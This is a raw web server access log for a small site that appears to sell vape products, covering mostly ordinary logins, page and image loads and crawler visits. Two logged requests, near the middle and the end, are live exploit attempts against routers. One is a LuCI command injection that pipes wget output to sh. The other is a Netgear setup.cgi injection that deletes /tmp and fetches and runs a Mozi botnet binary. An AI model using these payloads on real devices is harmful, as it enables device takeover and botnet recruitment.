37.201.160.212 - - [15/May/2024:10:42:03 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:53 +0200] "GET /logout HTTP/1.1" 302 665 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:53 +0200] "GET / HTTP/1.1" 200 1464 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:53 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:53 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:53 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:58 +0200] "GET /login HTTP/1.1" 200 911 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:58 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:04:58 +0200] "GET /static/styles/login.css HTTP/1.1" 200 495 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "POST /login HTTP/1.1" 302 627 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET / HTTP/1.1" 200 1481 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_blue_razz_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_energy_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_watermelon_on_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_triple_mango_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_triple_berry_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_triple_melon_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_kiwi_passion_fruit_guava_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_blueberrry_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:36 +0200] "GET /uploads/10_coconut_pineapple_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:38 +0200] "GET /login HTTP/1.1" 200 910 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:38 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:38 +0200] "GET /static/styles/login.css HTTP/1.1" 200 494 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:43 +0200] "POST /login HTTP/1.1" 302 970 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:43 +0200] "GET / HTTP/1.1" 200 1715 "http://93.231.141.58/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:43 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:16:05:43 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
35.196.132.85 - - [07/Aug/2024:16:06:24 +0200] "GET / HTTP/1.1" 200 6898 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
188.136.78.240 - - [07/Aug/2024:16:06:27 +0200] "GET / HTTP/1.1" 200 1232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:27 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:27 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_coconut_pineapple_savage_vape.png HTTP/1.1" 200 91230 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_triple_berry_ice_savage_vape.png HTTP/1.1" 200 147605 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_kiwi_passion_fruit_guava_savage_vape.png HTTP/1.1" 200 132485 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_energy_savage_vape.png HTTP/1.1" 200 126668 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_triple_melon_savage_vape.png HTTP/1.1" 200 144011 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_blue_razz_ice_savage_vape.png HTTP/1.1" 200 121417 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_triple_mango_savage_vape.png HTTP/1.1" 200 131154 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 200 139642 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_blueberrry_ice_savage_vape.png HTTP/1.1" 200 121842 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /uploads/10_watermelon_on_ice_savage_vape.png HTTP/1.1" 200 146100 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:06:28 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
37.201.160.212 - - [07/Aug/2024:16:06:34 +0200] "-" 408 0 "-" "-"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET / HTTP/1.1" 200 1232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /static/styles/home.css HTTP/1.1" 200 623 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_blue_razz_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_triple_mango_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_triple_melon_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_triple_berry_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_watermelon_on_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_energy_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_coconut_pineapple_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_blueberrry_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_kiwi_passion_fruit_guava_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
188.136.78.240 - - [07/Aug/2024:16:07:42 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
174.138.54.57 - - [07/Aug/2024:16:25:51 +0200] "GET / HTTP/1.0" 200 6917 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
185.224.128.83 - - [07/Aug/2024:16:55:04 +0200] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.20.232%2Ft%7Csh%3B%60) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
174.138.54.57 - - [07/Aug/2024:16:59:37 +0200] "GET / HTTP/1.1" 200 1232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
174.138.54.57 - - [07/Aug/2024:16:59:37 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.141.58/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
167.94.146.48 - - [07/Aug/2024:17:01:06 +0200] "GET / HTTP/1.1" 200 6898 "-" "-"
167.94.146.48 - - [07/Aug/2024:17:01:12 +0200] "GET / HTTP/1.1" 200 1176 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [07/Aug/2024:17:01:12 +0200] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [07/Aug/2024:17:01:12 +0200] "PRI * HTTP/2.0" 400 488 "-" "-"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET / HTTP/1.1" 200 1232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_blue_razz_ice_savage_vape.png HTTP/1.1" 200 121418 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_energy_savage_vape.png HTTP/1.1" 200 126668 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_triple_mango_savage_vape.png HTTP/1.1" 200 131155 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_watermelon_on_ice_savage_vape.png HTTP/1.1" 200 146100 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_triple_berry_ice_savage_vape.png HTTP/1.1" 200 147606 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:28 +0200] "GET /uploads/10_triple_melon_savage_vape.png HTTP/1.1" 200 144010 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:29 +0200] "GET /uploads/10_kiwi_passion_fruit_guava_savage_vape.png HTTP/1.1" 200 132484 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:29 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 200 139641 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:29 +0200] "GET /uploads/10_blueberrry_ice_savage_vape.png HTTP/1.1" 200 121842 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:29 +0200] "GET /uploads/10_coconut_pineapple_savage_vape.png HTTP/1.1" 200 91230 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:29:29 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET / HTTP/1.1" 200 1444 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /static/styles/base.css HTTP/1.1" 200 692 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_blue_razz_ice_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_energy_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /static/styles/home.css HTTP/1.1" 200 624 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_watermelon_on_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_triple_mango_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_triple_berry_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_triple_melon_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_strawberry_kiwi_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_kiwi_passion_fruit_guava_savage_vape.png HTTP/1.1" 304 183 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_blueberrry_ice_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /uploads/10_coconut_pineapple_savage_vape.png HTTP/1.1" 304 182 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
37.201.160.212 - - [07/Aug/2024:17:31:03 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.141.58/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
175.148.201.146 - - [07/Aug/2024:17:51:38 +0200] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.148.201.146:47415/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 382 "-" "-"
149.50.103.48 - - [07/Aug/2024:17:57:17 +0200] "GET / HTTP/1.1" 200 6898 "-" "-"
155.133.23.58 - - [07/Aug/2024:18:07:09 +0200] "GET / HTTP/1.0" 200 6917 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3"
